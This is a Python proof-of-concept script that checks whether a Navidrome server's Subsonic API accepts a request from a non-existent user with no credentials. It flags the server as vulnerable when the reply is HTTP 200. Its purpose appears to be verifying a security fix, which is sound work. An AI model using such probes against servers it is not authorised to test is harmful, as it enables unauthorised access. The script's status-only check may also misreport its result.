#!/usr/bin/env python3
"""
Script to reproduce the authentication bypass vulnerability in Subsonic API.

This script demonstrates that when a non-existent username is used,
the request should be rejected with an authentication error but currently
may bypass authentication.
"""

import requests
import sys
import os

def test_authentication_bypass():
    """Test the authentication bypass vulnerability."""
    
    # Use the Navidrome instance URL - adjust as needed
    base_url = os.environ.get('NAVIDROME_URL', 'http://localhost:4533')
    
    # Test endpoint: ping.view which requires authentication
    endpoint_path = '/rest/ping.view'
    
    # Parameters for the Subsonic API request
    params = {
        'v': '1.16.1',              # API version
        'c': 'test',                # Client name
        'u': 'nonexistentuser',     # Non-existent username
        'f': 'json'                 # Response format
    }
    
    try:
        # Make request without any password/token credentials
        url = base_url + endpoint_path
        print(f"Testing vulnerability with URL: {url}")
        print(f"Parameters: {params}")
        
        response = requests.get(url, params=params, timeout=10)
        
        print(f"\nResponse Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200:
            print("\n❌ VULNERABILITY CONFIRMED: Request succeeded when it should have been rejected!")
            print("   Expected: Authentication failure (error code 40)")
            print("   Actual: HTTP 200 OK response")
            return True
        elif response.status_code == 401 or response.status_code == 403:
            print("\n✅ SECURE: Authentication properly rejected with HTTP error")
            return False
        else:
            # Check if the response contains a Subsonic error
            try:
                if 'error' in response.text.lower():
                    print("\n✅ SECURE: Response contains error (likely authentication failure)")
                    return False
                else:
                    print("\n❓ UNCLEAR: Unexpected response - vulnerability status unclear")
                    return None
            except:
                print("\n❓ UNCLEAR: Could not parse response")
                return None
                
    except requests.exceptions.ConnectionError:
        print(f"\n❌ ERROR: Could not connect to {base_url}")
        print("   Make sure Navidrome is running on the expected URL")
        print("   You can set NAVIDROME_URL environment variable to change the URL")
        return None
    except Exception as e:
        print(f"\n❌ ERROR: {str(e)}")
        return None

def main():
    """Main function."""
    print("🔒 Testing Subsonic API Authentication Bypass Vulnerability")
    print("=" * 60)
    
    result = test_authentication_bypass()
    
    if result is True:
        print("\n⚠️  Security vulnerability detected!")
        sys.exit(1)
    elif result is False:
        print("\n✅ No vulnerability detected - authentication working correctly")
        sys.exit(0)
    else:
        print("\n❓ Test inconclusive")
        sys.exit(2)

if __name__ == '__main__':
    main()